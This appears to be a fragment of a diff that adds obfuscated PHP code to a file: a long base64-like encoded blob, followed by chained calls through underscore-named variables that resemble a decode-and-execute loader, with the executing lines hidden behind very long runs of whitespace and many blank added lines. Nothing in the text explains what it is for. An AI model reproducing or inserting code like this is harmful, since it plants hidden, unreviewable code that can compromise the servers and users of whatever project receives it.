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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
